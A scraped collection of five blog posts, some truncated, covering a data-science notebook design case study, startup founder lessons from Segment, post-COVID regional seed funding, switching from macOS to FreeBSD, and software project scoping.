</p><p>We pivoted, focusing on increasing the discoverability of notebooks to improve collaboration.<strong> </strong>That meant displaying every findable notebook in our database, enabling users to search and discover notebooks created by others in addition to their own past work. Mapping different discovery flows became important. By visualizing workflows and user journeys, I helped the team understand what changes could have the biggest impact.&nbsp;</p></div><div><figure><div><div></div></div></figure><p>A workflow showing how feature changes would affect the user experience</p></div><div><p><strong>Highly variable workflows are normal</strong></p><p>At first, we thought it would be simple to find a typical workflow among all our users. However, we learned that, while all data scientists want to get insights from data, there are many ways to reach that goal. Some run one-off queries to test hypotheses, others are embedded in month-long projects that require complicated analysis.&nbsp;
</p><p>Instead of forcing one flow on everyone, I designed an interface structure that was flexible enough to accommodate a dense amount of variable information, while highlighting a few primary actions.</p><p>We knew that the users were mainly visiting our platform to launch their notebook tool, so our quick actions had a large “Open” button that brought them directly to their coding environment. For notebooks without a VM, we made it easy for users to add one. For the layout, we created sortable columns and expandable drawers to empower the user to arrange the information to their liking.</p></div><div><p><strong>Conclusion</strong></p><p>This is one of the most exciting products I’ve designed at Spotify. While it was challenging to create a product that served our many discovered use cases, it was also highly rewarding.</p><p>Firstly, ScienceBox Cloud has become highly successful. By having designers dedicated to creating a better experience for data scientists, we eliminated those old inefficient practices and allowed them to run their code up to 50% faster than before.&nbsp;
</p><p>Secondly, throughout the …</p></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>In Segmentâ€™s early days, we hit countless problems as a founding team. And at the time, I thought those problems were unique to our own special snowflake of a founding journey. I chalked it up to us being new grads and first-time founders.</p><p>But as I've worked with more and more startups, I've realized just how wrong I was.</p><p>Over the past five years, I've made about 25 different seed-stage investments. In doing so, it's taught me a <em>LOT</em> about the common errors that startup founders make. Even across different industries and levels of experience, I see founders hitting the exact same set of problems we encountered in the early days of Segment!</p><p>This post shares a handful of the top lessons that benefit todayâ€™s early stage founders. Itâ€™s a list of the things I wish weâ€™d figured out earlier at Segment. [1]</p><p>This sounds incredibly boring... but the #1 mistake I see startups making is that they donâ€™t set goals. If you take one thing from this post, it's that you should set goals for where you want to be.</p><p>For the longest time at Segment, we didn't have goals. We moved ahead in various (often random) directions, and we would launch features consistently... but we never really set goals at all.</p><p>As we grew the company, we started to lose momentum. Teams were spending time on a bunch of stuff that frankly just didn't really matter to the overall business.</p><p>It wasn't until we hired our VP Eng, Tido, that we finally started setting focused and audacious product goals. Just by verbalizing where we wanted to go and then grading our results, our velocity improved by an order of magnitude.</p><p>I don't care if you call them OKRs, sprints, or something else entirely. Just set a deadline when you want to have something done and a metric you want to move or some other concrete result.</p><p>When early stage founders do attempt to set goals, I often see them agonize over what specific goals to choose. In practice, a "pretty good goal" is way better than "no goals at all". Perfect is the enemy of good.</p><p>If you don't yet have product-market fit, your goal should probably be getting your first 3-5 customers using the product. If you've hit the level where you now have dozens of users, your goal should be growing by an order of magnitude. It's better to get in the habit of setting and driving towards goals rather than being too worried about their exact semantics. Worst case, you just pick a better goal later.</p><p>A great set of goals answers the question: <em><strong>"what would have to be true in order for us to feel good about our progress at the end of the month?"</strong></em><em> [2]</em></p><p>If each teammate can independently answer "what are our goals for the month?" in the same way, you'll know you've succeeded. If youâ€™re looking for prior art, read <a href="https://www.amazon.com/Measure-What-Matters-Google-Foundation/dp/0525536221">Measure What Matters</a>. </p><p>If you strictly focus on making things true by a certain date, you are bound to make at least some progress towards your end result. </p><p>At the end of the day, every billion-dollar startup is really just the sum of many small deltas.</p><p>Let's get one thing straight: your investors won't know everything. But investors won't know <em>anything</em> if you don't keep them updated on how things are going.</p><p>For the longest time, we were fearful of our Segment investors, to the point that we wouldn't bother sending them emails unless they asked about us. I can say now with confidence that this was 100% the wrong approach.</p><p>We worried that investors would think that we were screwing up (true) and failing (true as well!). And while that might be the case, a founder-friendly investor won't think that way. Investors, especially angels, invested because they believe in <em>you</em>. If I didn't think a team would go somewhere, I wouldn't put money in.</p><p>With each investor, <strong>include the goals you're working towards, as well as the asks for them</strong>. I think monthly is about the right cadence for this in the early days, moving to quarterly around Series A/B time when you start partnering more with a few board members.</p><p>Simply writing the updates should clarify your own thinking tremendously. If it takes you more than 1-2h to put together an update on the most important things happening at the company, it's probably a sign that you should be doing more thinking about the big picture.</p><p>When asking for help, the things that our investors have been able to help us with evolved quite a bit over time. But here's a good rule of thumb for what to ask for:</p><ul><li><p><u>Seed/Pre-seed</u>: user-testing, intros to beta users, hiring</p></li><li><p><u>Series A</u>: hiring, early customers, go-to-market</p></li><li><p><u>Series B/C+</u>: comparables at other companies, senior/exec hires, specific expertise around things like management, infrastructure, systems, etc.</p></li></ul><p>Not all investors will be able to help with everything. But at the very least, sending them information will help you be top of mind. I've lost track of how many times a moment of serendipity where I'm catching up with an old friend has led to a meaningful conversation for a company I've invested in.</p><p>As an extra bonus, the strongest startups send these updates to everyone on their team. It's amazing how much putting the goals in writing helps everyone stay on the same page about what's most important.</p><p>One other note here: take pictures. I now wish we had far more pictures of Segment at every stage of the company. They help turn investor updates into cherished memories.</p><p>Okay, this lesson is taken directly from the YC playbook. And YET, I see so many founders (including YC founders) fail to launch their product. </p><p>If no one notices your launch... just ignore it and then launch again. If you're doing things right, you'll never run out of stuff to launch! [3]</p><p>Why is launching so important? Let me share a personal story...</p><p>We spent about 1.5 years building different iterations of analytics tools. For every iteration, we had a waitlist that users could sign up to use. We personally reached out to the users who we thought were the best fits, and then tried to set up time to use the product. </p><p>The result? Nobody cared. We had no users. We never launched. </p><p>When we finally launched Segment in it's current incarnation, we threw out that approach entirely. We put up a self-service flow, and let anyone who wanted to sign up for it.</p><p>That's when something strange happened... we attracted an entirely new set of developers who just were crawling out of the woodwork and excited to use the new product we'd built. They were coming from companies far outside of SV that we'd never heard of.</p><p>It floored me.</p><p><strong>Lesson learned: the people you happen to be talking to now are probably not the people who have the biggest problem in your space. Do everything you can to reach the folks with the biggest problem, and then, reduce any barriers they might encounter.</strong></p><p>I expect a bunch of you reading this post to ignore this advice, just like we did in the early days. It takes a certain confidence to launch something you've built and put it out there for the world to see. Ultimately though, the rewards are worth it. You'll see users coming from communities you've never even heard of.</p><p>Let me tell you a tale of two startups.</p><p><strong>Startup A</strong> is constantly putting up interesting content on their blog. Their founders are sharing product launches, engineering posts, and creatively brainstorming about what it takes to solve problems in their market.</p><p><strong>Startup B</strong> is operating in stealth. You can't find much about them online, but one of the founders reached out with a nice personalized email mentioning their funding by a top-tier VC. </p><p>Suppose you're looking for a job... do you pick Startup A or Startup B? In my experience, A almost always wins. Momentum is a compounding force.</p><p><strong>Unless you are working in a space that heavily depends on IP, you should probably be publishing more content about what you are doing.</strong> This could be open source, it could be a weekly newsletter, it could be a changelog. [4]</p><p>Whatever it is, it's going to help you both hire <em>and</em> attract customers. So much of the internet is merely about consuming, that just by putting ideas out there, youâ€™ll have a leg up on the competition.</p><p>In the early days of Segment, our <a href="https://segment.com/blog/show-hn-to-series-d/">user acquisition was powered by open source projects and blog posts</a>. But I've seen founders have success with Twitter, Substacks, Podcasts and a variety of different channels.</p><p>If you're looking for inspiration, the <a href="https://railway.app/changelog">Railway</a> and <a href="https://linear.app/changelog">Linear</a> changelogs are epic examples. Companies like <a href="https://baremetrics.com/blog/i-sold-baremetrics">Baremetrics</a> and <a href="https://buffer.com/resources/shareholder-update-q2-2020-and-july/">Buffer</a> differentiated themselves by just being open and honest. <a href="https://stripe.com/blog/globe">Stripe</a> and <a href="https://www.figma.com/blog/behind-the-feature-the-making-of-the-new-auto-layout/">Figma's blogs</a> not only share what they build, but how they built it.</p><p>There are three big inputs that all startups need to continue growing</p><ol><li><p>product capabilities</p></li><li><p>customers and users</p></li><li><p>hiring</p></li></ol><p>I've put them in roughly the order that most teams encounter them. </p><p>Startups begin with a small product that has a modicum of utility. It starts attracting a handful of customers organically. And as more and more customers start using the product, the founders realize that they need extra help to stay on top of all of those requests.</p><p>Remember though, the real goal here is #2. Itâ€™s not the size of your team, itâ€™s the value youâ€™re able to provide to the world. [5]</p><p>I see hiring a big team before you have product-market fit as a red flag. If the company doesn't yet have a set direction, it's going to be harder to pivot with 10 people than it is with 3.</p><p>But, I've worked with startups who have traction and runway... and just seem to be spinning their wheels under load from existing customers.</p><p>I get it. Hiring isn't the most fun, especially for an introvert. It's a lot of interviewing and feeling like there's a lot of rejection. Rejecting people sucks. Losing candidates sucks. For many of our roles at Segment, we've had to talk with 50-100 different people to make an eventual hire.</p><p><strong>If you have 24 months of runway, and a clear list of things youâ€™d do if you had more copies of yourself: you probably aren't spending time to hire the people you need.</strong></p><p>At Segment, my co-founder <a href="https://twitter.com/ivolo">Ilya</a> fulfilled this role. It was back in 2014, we were 12 people at the time, had raised a $10m Series A, and had $1m in revenue.</p><p>Thing…</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><article id="block-8ca89adf869e4a94bbd64c5caa6a5c7c"><p><span><span><em>November 29, 2020</em></span></span></p><p><span><span>COVID has changed the world in so many ways, some positive and some negative. But I don't hear anyone talking about how most secondary- and tertiary-market seed funds will fail post-COVID. The world of fundraising will forever change as a result of COVID, and that will be most true at the earliest stages of pre-seed and seed. </span></span></p><p><span><span>To understand why I think these funds will fail, let's start with what's wrong with these funds. It's quite simple, really: </span><span><strong>At their core, many (most?) early-stage funds outside the capital centers of the Bay Area and NYC are location arbitrage opportunities. </strong></span><span>The GPs at these funds believe they can get better deals in companies solely because of their location.</span></span></p><h2 id="block-9ba6416400f94005adca707b24ed7874"><span id="9ba6416400f94005adca707b24ed7874"></span><span><span>What's wrong with regional seed funds today: "That's not market"</span></span></h2><p><span><span>Raising money early-on in a company's life has traditionally been a location-dependent endeavor. It's been too hard and costly to fly to SF/NYC to raise $1m-2m. And with small funds (and plentiful deal flow in SF/NYC) investors aren't coming to you, either. That has meant that regional funds — of which there tend to be few per region — have a monopoly on deal flow.</span></span></p><div id="block-16a387659a2d4ba88bdea3c1b8614ad2"><div id="block-33764da90b5f46f1bb507f60faacfa05"><div id="block-b4c49be9d9a440aab01d063f9583e525"><picture><source srcset="https://api.super.so/asset/iseff.com/ffa308f2-c031-4c72-853e-49a349ef1c80.jpg?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/iseff.com/ffa308f2-c031-4c72-853e-49a349ef1c80.jpg?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/iseff.com/ffa308f2-c031-4c72-853e-49a349ef1c80.jpg?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/iseff.com/ffa308f2-c031-4c72-853e-49a349ef1c80.jpg?w=1500" alt="image" loading="lazy"></picture></div></div><div id="block-fd907732c69c41a2a27e738e6768221f"><p><span><span>One of the oddest, but most common, examples of how this plays out is a phrase I hear frequently in Michigan: "That's not market." When a startup wants to raise money and is hoping for a low-to-reasonable valuation for SF/NYC, the local investor will respond, "That's not market, it's much too high for this area."</span></span></p></div></div><p><span><span>I have no idea what that phrase actually means. The average deal price gets you an average deal. Do the investors only want average deals? Personally, I only want to invest in the best companies, and I'm willing to pay up for them. The upside more than makes up for it.</span></span></p><p><span><span>Any talk of what "market" is devalues the specific startup in question. Imagine if Elon Musk came to these investors and said, "I'm starting a new company in Michigan and am looking for capital, but I want a $100m valuation pre-revenue." Would they balk at the valuation, or write the check because he's one of the greatest entrepreneurs of our time who only works on humanity's existential issues?</span></span></p><p><span><span>In the last 20 years many states have attempted economic development policies that included setting aside money for venture capital. Foundations have provided even more capital. The goal is to have pseudo-economic development funds drive technology startup growth in their state.</span></span></p><p><span><span>So when you hear regional firms play a game that begins and ends with cramming founders on valuation, you wonder how the backers (the state and the foundations) think about their actions vis-a-vis the goal of bringing more startups to their state. After all, if a founder can choose between starting a company in, say, Michigan and taking 30-40% dilution or starting a company in SF and taking 10-20% dilution, which do you think they're going to take?</span></span></p><h2 id="block-3b23795570f44ff8b2446df2a1ab6f1b"><span id="3b23795570f44ff8b2446df2a1ab6f1b"></span><span><span>What happens next: Location arbitrage is a losing strategy post-COVID</span></span></h2><p><span><span>More to the point, though, is that playing the location arbitrage game is a losing strategy post-COVID. </span></span></p><p><span><span>The reason you don't see more regional growth funds is that it's much easier to travel at those stages. If you're raising $20-50m or more, your company is at a point where there's no problem buying a plane ticket and a hotel and going to SF for a week followed by NYC for a week. And the investors' funds are big enough, chasing so few great deals, that they're willing to get on a plane and visit you, too. </span></span></p><p><span><span>Thus, there's no meaningful location arbitrage in the later stages. You don't need the local capital and the capital doesn't need to be local, so everyone travels to make the best deals, regardless of location. That means the best companies, the best investors, and the best terms.</span></span></p><div id="block-9c2b746d036548858d0a400824b908dd"><div id="block-2925cc3a4e2e460da077fca210bedd50"><p><span><span>The same tectonic shift is about to happen in regional seed funds: in the last 9 months since COVID took over our lives, we have all become extremely comfortable doing deals over Zoom. Even if it's not the #1 choice for some people, it's reality for everyone now.</span></span></p><p><span><span>For a founder, then, the choice will be very simple: start your business wherever you want and raise from the best investors on the best terms, regardless of their location. Zoom has become the cheap flight to SF/NYC that we've never had before.</span></span></p></div><div id="block-85b9ad31522f4f83a09133b9f2d44add"><div id="block-b05d1b9c33b6441987e1582e49a5e4c8"><picture><source srcset="https://api.super.so/asset/iseff.com/78d866b4-3d0e-48c6-9ed0-179c9adca806.jpg?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/iseff.com/78d866b4-3d0e-48c6-9ed0-179c9adca806.jpg?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/iseff.com/78d866b4-3d0e-48c6-9ed0-179c9adca806.jpg?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/iseff.com/78d866b4-3d0e-48c6-9ed0-179c9adca806.jpg?w=1500" alt="image" loading="lazy"></picture></div></div></div><p><span><span>The losers of this shift, of course, are the regional seed funds who no longer have a location arbitrage opportunity.</span></span></p><p><span><span>Ironically, for many of the pseudo-economic development funds, the goal of their backers may actually come true now. The exodus from SF is real, and secondary- and tertiary-markets are lighting up with founders. At Assembler Labs, we're seeing plenty of potential founders come back to the Midwest from the coasts. They saw COVID as their opportunity to start a company in a cheaper area, be closer to family, find better housing, etc. And they knew they could fundraise from the best funds as well as recruit the best people, regardless of location.</span></span></p><p><span><span>While the states and foundations put their money behind funds that will lose, they may accidentally achieve their goal of more startups in the area.</span></span></p><h2 id="block-cd535b32790c4dc593da5589468699fb"><span id="cd535b32790c4dc593da5589468699fb"></span><span><span>How can regional funds win?</span></span></h2><p><span><span>What's a regional seed fund to do? It's a question we've been asking ourselves at Assembler Labs. While we are not strictly a fund (we are a startup studio that works with founders to create companies from scratch), we have been regionally focused for the last two years. We've been rethinking our strategy, ensuring we can capitalize on a post-COVID world. It's still an open question, but here's how we're thinking about it right now:</span></span></p><h3 id="block-cad3b2306d8d42b19998a309283e8e6a"><span id="cad3b2306d8d42b19998a309283e8e6a"></span><span><span>1. Build a great product for founders</span></span></h3><div id="block-690e4314170740daac7a7a67e6c80bab"><div id="block-3c46b658b1c04b70b4f0b6620d6d0ab7"><div id="block-e6cdba98bd9e4af0a418afe3c42802cd"><picture><source srcset="https://api.super.so/asset/iseff.com/a739c0ff-a9ad-4bc8-a006-0c347701de41.jpg?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/iseff.com/a739c0ff-a9ad-4bc8-a006-0c347701de41.jpg?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/iseff.com/a739c0ff-a9ad-4bc8-a006-0c347701de41.jpg?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/iseff.com/a739c0ff-a9ad-4bc8-a006-0c347701de41.jpg?w=1500" alt="image" loading="lazy"></picture></div></div><div id="block-4a6dbda2077043a2b47a350ddf4bfe7a"><p><span><span>First and foremost, funds must think of themselves as having a product. If they think their product is just capital, they're probably going to lose. This already happened over the last decade by the biggest and best funds (see: a16z), but few seed funds, specifically regional seed funds, rarely think this way. a16z really pioneered this, with their platform for entrepreneurs: back office help, strong network, recruiters on staff, etc. There's a reason why a16z has almost 200 employees today.</span></span></p></div></div><p><span><span>I believe platforms like a16z will work their way down to the seed level. It won't happen in the same way, but it will happen. The best seed investors will prime their companies for success in a way other firms simply can't.</span></span></p><h3 id="block-ec9dc177f5b94b3ea84a12e9980a163e"><span id="ec9dc177f5b94b3ea84a12e9980a163e"></span><span><span>2. Fish in a smaller, stocked pond</span></span></h3><p><span><span>Another way for regional funds to win is to become experts in verticals, or otherwise become thesis-driven investors. This allows investors to dive really deep, provide lots of value, and send a strong signal to future investors and customers that a company which has been vetted and invested in by this firm is going to be one of the best in this industry. </span></span></p><p><span><span>That specialization also leads to highly-targeted deal flow. As a GP, removing the location constraint can end up meaning wandering in a vast expanse not knowing where or how to find the best deals. It's analogous to fishing a new lake, having no idea where the best holes are. </span></span></p><div id="block-ec0aac7a5eeb4435a098cb7baea92e43"><div id="block-0d6a82e55f724ebb8db37e68f35ff434"><p><span><span>By specializing in an industry or thesis, they can focus on building an extremely strong network and target specific companies about to break out. It allows the fund to move from passive (deals come to them by virtue of the fact that there are only a few funds in their region) to active (seeking out the best deals, narrowed by thesis). In other words, they can fish in a small, stocked pond.</span></span></p></div><div id="block-fd9734fa9a6a491b9f879a53e7d69509"><div id="block-97dd7978de2b412da4c10a302cb019f9"><picture><source srcset="https://api.super.so/asset/iseff.com/e3deb73d-891d-4567-8de1-b2aa04af14cb.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/iseff.com/e3deb73d-891d-4567-8de1-b2aa04af14cb.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/iseff.com/e3deb73d-891d-4567-8de1-b2aa04af14cb.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/iseff.com/e3deb73d-891d-4567-8de1-b2aa04af14cb.png?w=1500" alt="image" loading="lazy"></picture></div></div></div><h2 id="block-e70f5f08e1cc4b13803fd0e7f922758c"><span id="e70f5f08e1cc4b13803fd0e7f922758c"></span><span><span>Meanwhile, for founders, the wall is coming down</span></span></h2><p><span><span>While much of the above has been focused on the fund and the fund manager, I don't want to dismiss the fact that this tectonic shift is a huge gain for founders everywhere.</span></span></p><div id="block-bb0e028c1c5347888693a4d6f6f3f10e"><div id="block-8d1b7ed62ac54ae3ac632a985e6f55e7"><div id="block-04d0dc914fd94951b81f7970586a1cc2"><picture><source srcset="https://api.super.so/asset/iseff.com/dc2c82e0-e9d1-4d28-ad6a-8caa63b25f55.png?w=400&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/iseff.com/dc2c82e0-e9d1-4d28-ad6a-8caa63b25f55.png?w=400" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/iseff.com/dc2c82e0-e9d1-4d28-ad6a-8caa63b25f55.png?w=400&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/iseff.com/dc2c82e0-e9d1-4d28-ad6a-8caa63b25f55.png?w=400" alt="image" loading="lazy"></picture></div></div><div id="block-99f3dc369c544a819dc93af0500b11f9"><p><span><span>"Talent is evenly distributed, but opportunity is not" has been a favorite phrase of mine for a while now.

        <p>I think the title tells a lot about the story I’m going to tell you.</p>
<p>This is not a technical documentation for how I migrated from macOS to FreeBSD. This is a high-level for <em>why</em> I migrated from macOS to FreeBSD.</p>
<p>Not so long ago, I was using macOS as my daily driver. The main reason why I got a macbook was the underlying BSD Unix and the nice graphics it provides. Also, I have an iPhone. But they were also the same reasons for why I <strong>left</strong> macOS.</p>
<p>I did not want to write this post right after the migration, I wanted to take my time, use FreeBSD daily, see if I will ever miss macOS.</p>
<p>Here’s a tweet of mine from 8 months ago</p>
<blockquote><div lang="en" dir="ltr"><p>Every 4 months I look at my systems (servers, laptops, desktops, embedded) to see if there's anything suspicious, if anything got hacked, etc.</p><p>man, I did not realize that macOS is that complicated. Why is there a "studentd" running? I don't even use Classrooms :/</p></div>— Antranig Vartanian (@antranigv) <a href="https://twitter.com/antranigv/status/1234753346600394752?ref_src=twsrc%5Etfw">March 3, 2020</a></blockquote>


<p>Let’s look at it this way. macOS is becoming less Unix-y every year, <code>date(1)</code> is outdated, there are 100+ Unix processes running by the time the system is booted, most of them are useless for the general user, it has no native package manager (at least MacPorts/homebrew/pkgsrc is out there) and for a power user, there is no proper documentation. Have you ever checked the FreeBSD handbook? Everything is right there!</p>
<p>Okay, the nice graphics part. Have you seen the latest and greatest Big Sur? It feels like eye-candy, it’s not made for power users at all, everything seems to be a distraction now, even the icons. I’m no UI guru, but bringing iOS to the desktop is not for everyone.</p>
<p>So I decided to move to FreeBSD. This is where many people will tell me “Okay but not everything works outside the box”, true! but which OS works outside the box these days anyway? Windows is still a nightmare, setting up macOS took me 3 days the last time, Linux takes way more if you’re building it from scratch. Setting up FreeBSD took me 3 days, however this meant that I will NOT need to change it again for a very, very, VERY long time.</p>
<p>Every time Apple pushed an updated, my <code>pf.conf</code> and <code>automount</code> configs got broken on macOS. They either got deleted or they moved somewhere. Well, the last 2 times it just got deleted.</p>
<p>On FreeBSD, I upgraded from <code>12.1-RELEASE</code> to <code>12.2-RELEASE</code> and nothing broke, and in case there were any changes, FreeBSD just asked me what to do about them.</p>
<p>Let’s come back for a second. Unix is outdated and Apple does not care about it, fancy graphics are too fancy now. Doing forensics is almost impossible. And the hardware is, well, not the best out there (have you ever disassembled a MacBook Pro? it’s takes 2 hours to change a battery while I can reassemble my Dell Latitudes and ThinkPads in 30 minutes).</p>
<p>So there was no reason to stay here anymore. I had to migrate. The question is: where?</p>
<p>Linux has systemd, not my favorite thing out there, Windows is privacy nightmare. That left me with 2 major options: Linuxes without systemd (Gentoo, in my case) or BSDs.</p>
<p>Since I run FreeBSD servers anyway, I just migrated to FreeBSD.</p>
<p>Here’s a short review about running FreeBSD on ThinkPad T480s.</p>
<ul>
<li>WiFi: works. not the fastest, but fast enough.</li>
<li>Graphics: works.</li>
<li>Touchpad: works with multiple fingers AND very configurable via <code>sysctl</code>.</li>
<li>BT does discovery and pairs, I still have to try it with non-Apple headphones.</li>
<li>COVID-19 era: Zoom, Google Hangouts, Jitsi and all other WebRTC-based video conferencing software works via web as well.</li>
<li>Thanks to <a href="https://forums.freebsd.org/threads/linuxulator-how-to-run-google-chrome-linux-binary-on-freebsd.77559/">Linuxulator</a>, I can watch Netflix as well: <a href="https://twitter.com/antranigv/status/1327422687107555329">here’s a screenshot</a>.</li>
</ul>
<p>Most importantly, it’s Free and Open Source.</p>
<p>It’s been 1 month and 1 day since I last touched my MacBook Pro, so, what do I miss?</p>
<ul>
<li>Better BT support</li>
<li>Faster WiFi</li>
</ul>
<p>That’s it, that’s all missing on a FreeBSD laptop these days. WiFi can do 48Mbps according to <code>ifconfig</code> but I usually get 10-20Mbps. BT pairs with my Apple AirPods but I wish it worked till the end.</p>
<p>Having a nice workstation/laptop is not an easy thing, using macOS means living by Apple rules, Windows is the same for Microsoft. The BSDs gave me the power to be as free as possible :)</p>
<p>During the next weeks I’ll try to blog about the actual setup.</p>
<p>P.S. dear Apple employee, in case you’re reading this, please tell your management to update their BSD Unix layer. Some of us still care, some of us are not just Docker people, some of us are not just “modern” web developers. Thanks in advance.</p>
<p>That’s all folks! :)</p>

<p>When 7pace <a href="https://www.7pace.com/blog/7pace-for-github-announcement">decided to build a time tracking solution for the GitHub universe</a>, our developers thought it should be a somewhat straightforward project. Take the Timetracker we already built for Azure DevOps, and make it work for Github users. No sweat, right?</p>



<p>If you’re a developer, you probably already see where this is going.</p>



<p>Of course it wasn’t that simple.</p>



<p>“The team [working on the GitHub extension] came from that original team,” said 7pace product manager Sascha Zierfuss. “So although we know exactly what we’re doing, we understand how customers are using it and all that — the new product is in a different realm. So a lot of the assumptions and the knowledge that we had no longer applies.”</p>



<p>In other words, features that were simple to build for the <a href="https://www.7pace.com/blog/azure-devops-best-practices">Azure DevOps Timetracker</a> were a lot more complicated to build for the GitHub Timetracker. And that meant, as the team was making time and effort estimates for different parts of the work, they were off —&nbsp;sometimes <em>way</em> off.</p>



<p>“Now we take a bit more time to dive a bit more deeply and think about it a bit more before coming up with an answer as to how complex or how easy or difficult something is,” Zierfuss explained. “We take a bit more time upfront. But that has made our sprints a lot more successful and helped with the planning as well. If there’s something we think we can achieve in, say, a few months, we’re now better able to assess whether we need some help to reach that goal, if we have to cut a few things, and so on.”</p>



<p>As the developers who are nodding along already know, the 7pace team didn’t have a unique problem. Most, if not all, software teams struggle at some point with scoping work, especially when they’re working on something they’ve never done before. But how can your team accurately scope work when <em>every</em> project is something new?</p>



<p>We don’t have a perfect answer —&nbsp;whoever figures out how to solve this challenge will be a hero to the developer community. But we think some of the lessons our team learned about this can help other developers. We think there’s a secret weapon for scoping that many teams haven’t even considered.</p>



<h2>Step 1: Keep Calm and Code On</h2>



<p>The first thing to keep in mind is that this isn’t a world-ending problem. Yes, we should all be striving to get better at scoping work. But it’s a challenge that literally every software team faces. Don’t believe us? Well, <a href="https://www.mckinsey.com/business-functions/mckinsey-digital/our-insights/delivering-large-scale-it-projects-on-time-on-budget-and-on-value#">one recent study</a> found that two out of every three enterprise software projects have cost and effort overruns.</p>



<figure><img loading="lazy" width="1024" height="668" src="http://www.7pace.com/wp-content/uploads/2020/11/66-with-frame-1024x668.png" alt="66% of enterprise software products have cost and effort overruns" srcset="https://www.7pace.com/wp-content/uploads/2020/11/66-with-frame-1024x668.png 1024w, https://www.7pace.com/wp-content/uploads/2020/11/66-with-frame-300x196.png 300w, https://www.7pace.com/wp-content/uploads/2020/11/66-with-frame-768x501.png 768w, https://www.7pace.com/wp-content/uploads/2020/11/66-with-frame-1536x1003.png 1536w, https://www.7pace.com/wp-content/uploads/2020/11/66-with-frame.png 1590w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>When it comes to scoping work, a little perspective can often be helpful. Keep in mind that estimates are a part of every step of the development process. We’re not giving you permission to give up on trying to be better at scoping, but we are saying: Don’t panic. Keep the work moving forward, even if it turns out your scoping is all wrong. And in the meantime, use these tips to get better at scoping your work.</p>



<h2>Project Scoping Best Practices</h2>



<p>When trying to scope a project, there are some best practices that can help all teams.</p>



<h3>Remember that Building Software Is an Evolving Process</h3>



<p>They call building software a “process of discovery” for a reason. As you move through any given project, you can <a href="https://www.7pace.com/blog/learning-is-work">expect it to evolve and change</a>. Requirements aren’t set in stone at the outset of a project, and as you progress through building the software, you may well find that you need to change the requirements along the way to better fit the spirit of what you’re trying to build.</p>



<p>This means that an important best practice is to stay in constant communication — with your team and with your client or organization. Keep every up-to-date on when and how project requirements are changing. This may mean making adjustments to your estimated scope as you go. But over time, your team should get better at making more accurate estimates.</p>



<h3>Mind Parkinson’s Law</h3>



<p>Parkinson’s Law says that work will expand to <a href="https://www.7pace.com/blog/healthier-work-systems">fill the time allotted for it</a>. That means that by giving yourself and your team deadlines based on your project scope, it’s just as important not to <em>overestimate</em> time and effort as it is not to <em>underestimate</em> them.</p>



<p>We get it. It’s easy to avoid missing deadlines by giving your team padded deadlines to allow for those unforeseen delays that every software team encounters. But this can just as easily result in taking much longer to deliver on a project than you actually need to, and thus getting in the habit of overestimating your scope.</p>



<p>Combat this by keeping sprints short. This means you get constant feedback on progress and new directions for the next sprint, which will help improve the quality of your time and effort estimates.</p>



<h3>Don’t Try to Transfer Estimates</h3>



<p>When scoping work, a very important thing to keep in mind is that time and effort estimates are not transferable between different members of your team. Developers vary wildly in their experience, expertise, work styles, and so many other factors that can affect how long it takes them to do a job.&nbsp;</p>



<p>You’ll make better estimates about scope if you do so with everyone’s personal experience and skill level in mind —&nbsp;and even better if every dev on the team is invited to help scope their own work.</p>



<h3>Beware of Context Switching</h3>



<p>Part of the work that developers do is juggling multiple projects, clients, and responsibilities. It’s not often that a developer or a team will be solely dedicated to one project at all times.</p>



<p>While this keeps the job fun and interesting, it comes with a major downside: Frequent switching between tasks and projects can severely interrupt your team’s flow, which can slow down the work and lead to inaccurate scoping.&nbsp;</p>



<p>This is another area where doing short sprints can help. That way, your team has predetermined blocks of time for different tasks and projects, and can mentally prepare as needed.</p>



<h2>How to Scope a Project, Step by Step</h2>



<p>Most of these best practices require having <em>some</em> grasp of the time and effort it will take your team to complete a project. But what if you truly don’t know, because the project is something totally new to your team?</p>



<p>Use this framework for collecting information and turning it into a project scope that’s as accurate as possible, even when you’re navigating new territory.</p>



<figure><img loading="lazy" width="1024" height="646" src="http://www.7pace.com/wp-content/uploads/2020/11/how-to-scope-a-software-dev-project-1024x646.png" alt="How to Scope a Software Development Project" srcset="https://www.7pace.com/wp-content/uploads/2020/11/how-to-scope-a-software-dev-project-1024x646.png 1024w, https://www.7pace.com/wp-content/uploads/2020/11/how-to-scope-a-software-dev-project-300x189.png 300w, https://www.7pace.com/wp-content/uploads/2020/11/how-to-scope-a-software-dev-project-768x484.png 768w, https://www.7pace.com/wp-content/uploads/2020/11/how-to-scope-a-software-dev-project-1536x969.png 1536w, https://www.7pace.com/wp-content/uploads/2020/11/how-to-scope-a-software-dev-project.png 1754w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<h3>Step 1: Collect All Crucial Information</h3>



<p>Before even beginning to estimate a project’s scope, you need to collect every piece of information about the project that might be relevant to the scope. This includes:</p>



<ul><li>Project deliverables</li><li>All available resources, including team members, money, and work capacity</li><li>Inclusions and exclusions</li><li>Project constraints</li></ul>



<p>Gather as much detail about each of these as you can, as well as any other project information that might be relevant to the scope.</p>



<h3>Step 2: Build a Project Schedule</h3>



<p>Using all the relevant project information, you can start to sketch a rough schedule for completing the project. In your schedule, start with major tasks and milestones, and once those are laid out, try to break them down further into minor tasks and milestones. For especially long or complex projects, it might help to break up the work into phases, first.</p>



<h3>Step 3: Tailor the Scope to Fit Your Team</h3>



